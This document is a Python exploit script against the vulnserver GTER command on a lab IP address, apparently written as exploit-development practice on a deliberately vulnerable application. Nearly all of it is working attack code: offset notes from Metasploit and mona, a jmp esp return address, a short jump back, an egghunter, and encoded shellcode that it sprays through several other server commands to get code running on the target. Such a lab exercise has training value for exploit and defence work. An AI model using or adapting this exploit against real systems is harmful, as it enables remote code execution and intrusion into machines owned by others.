#!/usr/bin/env python
from socket import socket, AF_INET, SOCK_STREAM

rhost = '192.168.41.128'
rport = 9999
target = (rhost, rport)

shellcode =  "w00tw00t"
shellcode += "\xbd\xd3\x13\x95\x6d\xdd\xc5\xd9\x74\x24\xf4\x5e"
shellcode += "\x29\xc9\xb1\x52\x31\x6e\x12\x83\xc6\x04\x03\xbd"
shellcode += "\x1d\x77\x98\xbd\xca\xf5\x63\x3d\x0b\x9a\xea\xd8"
shellcode += "\x3a\x9a\x89\xa9\x6d\x2a\xd9\xff\x81\xc1\x8f\xeb"
shellcode += "\x12\xa7\x07\x1c\x92\x02\x7e\x13\x23\x3e\x42\x32"
shellcode += "\xa7\x3d\x97\x94\x96\x8d\xea\xd5\xdf\xf0\x07\x87"
shellcode += "\x88\x7f\xb5\x37\xbc\xca\x06\xbc\x8e\xdb\x0e\x21"
shellcode += "\x46\xdd\x3f\xf4\xdc\x84\x9f\xf7\x31\xbd\xa9\xef"
shellcode += "\x56\xf8\x60\x84\xad\x76\x73\x4c\xfc\x77\xd8\xb1"
shellcode += "\x30\x8a\x20\xf6\xf7\x75\x57\x0e\x04\x0b\x60\xd5"
shellcode += "\x76\xd7\xe5\xcd\xd1\x9c\x5e\x29\xe3\x71\x38\xba"
shellcode += "\xef\x3e\x4e\xe4\xf3\xc1\x83\x9f\x08\x49\x22\x4f"
shellcode += "\x99\x09\x01\x4b\xc1\xca\x28\xca\xaf\xbd\x55\x0c"
shellcode += "\x10\x61\xf0\x47\xbd\x76\x89\x0a\xaa\xbb\xa0\xb4"
shellcode += "\x2a\xd4\xb3\xc7\x18\x7b\x68\x4f\x11\xf4\xb6\x88"
shellcode += "\x56\x2f\x0e\x06\xa9\xd0\x6f\x0f\x6e\x84\x3f\x27"
shellcode += "\x47\xa5\xab\xb7\x68\x70\x7b\xe7\xc6\x2b\x3c\x57"
shellcode += "\xa7\x9b\xd4\xbd\x28\xc3\xc5\xbe\xe2\x6c\x6f\x45"
shellcode += "\x65\x53\xd8\x6c\xf1\x3b\x1b\x6e\xe8\xe7\x92\x88"
shellcode += "\x60\x08\xf3\x03\x1d\xb1\x5e\xdf\xbc\x3e\x75\x9a"
shellcode += "\xff\xb5\x7a\x5b\xb1\x3d\xf6\x4f\x26\xce\x4d\x2d"
shellcode += "\xe1\xd1\x7b\x59\x6d\x43\xe0\x99\xf8\x78\xbf\xce"
shellcode += "\xad\x4f\xb6\x9a\x43\xe9\x60\xb8\x99\x6f\x4a\x78"
shellcode += "\x46\x4c\x55\x81\x0b\xe8\x71\x91\xd5\xf1\x3d\xc5"
shellcode += "\x89\xa7\xeb\xb3\x6f\x1e\x5a\x6d\x26\xcd\x34\xf9"
shellcode += "\xbf\x3d\x87\x7f\xc0\x6b\x71\x9f\x71\xc2\xc4\xa0"
shellcode += "\xbe\x82\xc0\xd9\xa2\x32\x2e\x30\x67\x52\xcd\x90"
shellcode += "\x92\xfb\x48\x71\x1f\x66\x6b\xac\x5c\x9f\xe8\x44"
shellcode += "\x1d\x64\xf0\x2d\x18\x20\xb6\xde\x50\x39\x53\xe0"
shellcode += "\xc7\x3a\x76"

crash = ('A'*180)
pattern = ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1'
           'Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3'
           'Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9')

# ESP
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 180 -q 1Af2
# [*] Exact match at offset 155
# EIP
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 180 -q 66413066
# [*] Exact match at offset 151
verify = ('A'*151) + ('B'*4) + ('C'*25)
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll)
jmp_esp = '\x03\x12\x50\x62'
# !mona offset -a1 00B7FA0C -a2 00B7F970
# Offset from 0x00b7fa0c to 0x00b7f970 : -156 (999990xFFFFFF64) bytes
# Negative jmp offset : \x64\xff\xff\xff
# !mona assemble -s 'JMP 0xFFFFFF69'
# Full opcode: \xe9\x69\xff\xff\xff
jmp_back = '\xE9\x69\xFF\xFF\xFF'
jmp_esp_payload = ('A' * 151) + jmp_esp + ('C'*25)
jmp_back_payload = ('A' * 151) + jmp_esp + jmp_back + ('C'*25)


egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
#Put this tag in front of your shellcode : w00tw00t

egghunter_payload = ('A'* 10) + egghunter + ('A' * 109) + jmp_esp + jmp_back + ('C' * 125)

payload = 'GTER ' + egghunter_payload

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    print('[*] Connecting to service')
    s.connect(target)
    data = s.recv(1024)
    print(data)
    print('[*] Sending malicious payload')
    print(payload)
    s.sendall(payload)
    print('[*] Spraying shellcode')
    for cmd in ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG', 'HTER', 'LTER', 'KSTAN']:
        print('[*] Spraying ' + cmd)
        spray = cmd + ' ' + shellcode
        s.sendall(spray)
    print('[*] B00M! ph33r')
    s.close()
